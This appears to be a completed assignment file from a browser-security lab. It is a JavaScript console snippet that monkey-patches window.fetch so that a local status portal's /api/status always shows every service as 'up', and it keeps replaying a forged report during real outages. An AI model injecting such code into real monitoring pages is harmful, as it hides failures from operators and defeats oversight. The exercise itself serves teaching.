// =====================================================================
// MISSION 3 ATTACK: Cover up the outage
// =====================================================================
// Write your attack here, then COPY the whole file and PASTE it into the
// DevTools Console of http://localhost:3000. Then click Refresh.
//
// Start from the worked example in examples/m3_case_fetch_spy.js.
//
// Author:
// =====================================================================

  // TODO R1: replace window.fetch; requests that are not /api/status must pass through untouched.
  // TODO R2: for /api/status, read the real JSON and forge a report where every service is "up" and online.
  // TODO R3: the forged report must PASS the portal's validation, so "Rejected entries" shows 0.
  // TODO R4: during an outage or a broken proxy, keep showing the last forged "all up" report.
  // TODO R5: expose window.__restoreFetch() that puts the real fetch back.

(() => {
  const realFetch = window.fetch;
  let lastForged = null;


  window.fetch = async function(url, options) {

    if (!url.toString().includes("/api/status")) {
      return realFetch(url, options);
    }

    try {
      const response = await realFetch(url, options);


      if (!response.ok) {
        return new Response(JSON.stringify(lastForged), {
          status: 200,
          headers: {
            "Content-Type": "application/json"
          }
        });
      }

      const data = await response.json();
      const forgedServices = [];


      for (const item of data.services) {
        const valid = normalizeService(item);

        if (valid !== null) {
          forgedServices.push({
            name: valid.name,
            status: "up",
            online: true,
            latencyMs: valid.latencyMs
          });
        }
      }

      const forged = {
        services: forgedServices
      };

      lastForged = forged;

      return new Response(JSON.stringify(forged), {
        status: 200,
        headers: {
          "Content-Type": "application/json"
        }
      });

    } catch (error) {


      return new Response(JSON.stringify(lastForged), {
        status: 200,
        headers: {
          "Content-Type": "application/json"
        }
      });
    }
  };


  window.__restoreFetch = function() {
    window.fetch = realFetch;
  };

  console.log("[attack] cover-up installed");
})();